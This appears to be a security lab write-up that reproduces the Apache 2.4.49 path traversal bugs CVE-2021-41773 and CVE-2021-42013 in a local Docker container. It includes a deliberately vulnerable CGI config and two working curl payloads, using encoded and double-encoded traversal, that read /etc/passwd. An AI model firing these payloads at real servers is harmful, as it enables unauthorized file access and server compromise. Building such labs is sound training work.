# Phase 2g — Apache CVE-2021-41773 Path Traversal Lab

## What this exercises

- `hunt-path-traversal`
- CVE-2021-41773 reproduction (and CVE-2021-42013 incomplete fix
  variant)

## docker-compose.yml

```yaml
version: "3.8"
services:
  apache:
    image: httpd:2.4.49
    ports:
      - "127.0.0.1:8080:80"
    volumes:
      - ./httpd.conf:/usr/local/apache2/conf/httpd.conf:ro
```

## httpd.conf (minimum reproduction config)

Key snippet enabling the vulnerable behaviour:

```
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    Require all granted
</Directory>
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
```

The default 2.4.49 ships with `Require all granted` removed; tweak
in the config to re-enable for the lab.

## Repro

```bash
docker compose up -d
sleep 2

# CVE-2021-41773 — fetches /etc/passwd
curl -s --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"

# CVE-2021-42013 — incomplete fix, double-encoded
curl -s --path-as-is "http://127.0.0.1:8080/cgi-bin/.%%32%65/%%32%65%%32%65/etc/passwd"
```

Cleanup:

```bash
docker compose down
```

## Notes

- The lab uses image `httpd:2.4.49` specifically. Newer tags
  (`2.4.51`+) have the patch.
- Some Docker builds disable the CGI module by default; if the
  CGI path 404s, mount a custom `httpd.conf` enabling
  `mod_cgi` and `LoadModule`.

## See also

- `skills/hunt-path-traversal/SKILL.md`
- `apache-cve-2021-41773.md` walkthrough
